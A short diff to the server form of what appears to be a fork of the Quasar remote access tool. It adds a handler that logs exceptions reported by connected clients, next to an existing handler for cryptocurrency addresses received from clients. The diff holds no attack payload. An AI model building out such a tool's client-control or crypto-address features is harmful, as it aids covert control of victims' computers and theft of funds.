@@ -46,6 +46,7 @@ namespace Quasar.Server.Forms
         private bool _titleUpdateRunning;
         private bool _processingClientConnections;
         private readonly ClientStatusHandler _clientStatusHandler;
+        private readonly ExceptionHandler _exceptionHandler;
         private readonly GetCryptoAddressHandler _getCryptoAddressHander;
         private readonly ClientDebugLog _clientDebugLogHandler;
         private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
@@ -56,6 +57,7 @@ namespace Quasar.Server.Forms
         public FrmMain()
         {
             _clientStatusHandler = new ClientStatusHandler();
+            _exceptionHandler = new ExceptionHandler();
             _getCryptoAddressHander = new GetCryptoAddressHandler();
             _clientDebugLogHandler = new ClientDebugLog();
             RegisterMessageHandler();
@@ -85,6 +87,11 @@ namespace Quasar.Server.Forms
             }
         }
 
+        private void OnExceptionReceived(object sender, ExceptionMessage message)
+        {
+            EventLog(message.Raw, "error");
+        }
+
         private void RegisterMessageHandler()
         {
             MessageHandler.Register(_clientDebugLogHandler);
@@ -95,6 +102,8 @@ namespace Quasar.Server.Forms
             _clientStatusHandler.UserActiveWindowStatusUpdated += SetUserActiveWindowByClient;
             MessageHandler.Register(_getCryptoAddressHander);
             _getCryptoAddressHander.AddressReceived += OnAddressReceived;
+            MessageHandler.Register(_exceptionHandler);
+            _exceptionHandler.ClientExceptionRaised += OnExceptionReceived;
         }
 
         private void UnregisterMessageHandler()
@@ -107,6 +116,8 @@ namespace Quasar.Server.Forms
             _clientStatusHandler.UserActiveWindowStatusUpdated -= SetUserActiveWindowByClient;
             MessageHandler.Unregister(_getCryptoAddressHander);
             _getCryptoAddressHander.AddressReceived -= OnAddressReceived;
+            MessageHandler.Unregister(_exceptionHandler);
+            _exceptionHandler.ClientExceptionRaised -= OnExceptionReceived;
         }
 
         public void UpdateWindowTitle()
